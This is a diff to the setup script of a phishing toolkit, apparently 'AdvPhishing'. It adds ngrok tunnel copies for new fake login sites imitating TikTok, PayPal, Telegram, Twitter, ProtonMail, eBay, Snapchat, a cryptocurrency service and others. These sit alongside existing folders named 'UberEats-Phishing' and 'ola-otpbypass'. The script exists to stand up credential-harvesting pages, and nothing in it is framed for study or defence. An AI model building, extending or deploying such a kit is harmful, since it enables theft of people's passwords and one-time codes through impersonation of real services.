@@ -4,7 +4,7 @@ clear
 echo ""
 echo ""
 echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m !!! MUST ROOT OTHERWISE SCRIPT NOT WORKING PROPERLY !!!    \e[0m'
-sleep 8
+sleep 3
 clear
 echo ""
 echo ""
@@ -38,6 +38,22 @@ cp -R ngrok sites/ola-otpbypass/
 cp -R ngrok sites/UberEats-Phishing/
 cp -R ngrok sites/Zomato-Phishing/
 cp -R ngrok sites/amazonsign/
+cp -R ngrok sites/tiktok/
+cp -R ngrok sites/phonepay/
+cp -R ngrok sites/paypal/
+cp -R ngrok sites/telegram/
+cp -R ngrok sites/twitter/
+cp -R ngrok sites/flipcart/
+cp -R ngrok sites/wordpress/
+cp -R ngrok sites/snapchat/
+cp -R ngrok sites/protonmail/
+cp -R ngrok sites/stackoverflow/
+cp -R ngrok sites/ebay/
+cp -R ngrok sites/twitch/
+cp -R ngrok sites/ajio/
+cp -R ngrok sites/cryptocurrency/
+cp -R ngrok sites/mobikwik/
+cp -R ngrok sites/pinterest/
 chmod 7777 AdvPhishing.sh
 clear
 echo ""
